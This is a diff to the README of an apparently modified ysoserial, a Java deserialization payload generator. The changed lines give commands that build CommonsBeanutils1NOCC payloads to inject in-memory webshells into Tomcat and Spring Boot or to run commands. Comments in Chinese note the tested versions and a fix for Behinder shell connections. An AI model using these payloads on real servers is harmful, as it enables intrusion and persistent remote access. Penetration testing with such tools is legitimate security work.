@@ -95,15 +95,16 @@ Usage: java -jar ysoserial-[version]-all.jar [payload] '[command]'
 ```shell
 java -jar ysoserial.jar CommonsBeanutils1NOCC "CLASS:TomcatCmdEcho"                     # TomcatCmdEcho
 java -jar ysoserial.jar CommonsBeanutils1NOCC "CLASS:TomcatServletMemShellFromJMX"      # TomcatServletMemShellFromJMX
+java -jar ysoserial.jar CommonsBeanutils1NOCC "CLASS:TomcatServletMemShellFromThread"   # TomcatServletMemShellFromThread springboot也成功过
 java -jar ysoserial.jar CommonsBeanutils1NOCC "CLASS:TomcatFilterMemShellFromJMX"       # TomcatFilterMemShellFromJMX     适用于tomcat7-9
-java -jar ysoserial.jar CommonsBeanutils1NOCC "CLASS:TomcatFilterMemShellFromThread"    # TomcatFilterMemShellFromThread  适用于tomcat7-9
-java -jar ysoserial.jar CommonsBeanutils1NOCC "CLASS:SpringInterceptorMemShell"         # SpringInterceptorMemShell       测试于springboot2.0.9.RELEASE 链接shell需要使用存在的路由
+java -jar ysoserial.jar CommonsBeanutils1NOCC "CLASS:TomcatFilterMemShellFromThread"    # TomcatFilterMemShellFromThread  适用于tomcat7-9 springboot也成功过
+java -jar ysoserial.jar CommonsBeanutils1NOCC "CLASS:SpringInterceptorMemShell"         # SpringInterceptorMemShell       测试于springboot2.0.9和2.6.5 链接shell需要使用存在的路由
 java -jar ysoserial.jar CommonsBeanutils1NOCC "FILE:E:\Calc.class"                      # ClassLoaderTemplate
 java -jar ysoserial.jar CommonsBeanutils1NOCC "CMD:calc"                                # CommandTemplate
 java -jar ysoserial.jar CommonsBeanutils1NOCC "calc"                                    # CommandTemplate                 不使用协议开头则默认为CMD:
 ```
 
-shell连接使用请查看指定类。解决了request和response包装类导致冰蝎链接失败的问题。
+shell连接使用请查看指定类。解决了request和response包装类导致冰蝎链接失败的问题，[见issue](https://github.com/rebeyond/Behinder/issues/187)。
 
 以下受到Gadgets.createTemplatesImpl影响的gadget均需要如上方式传递参数：
 
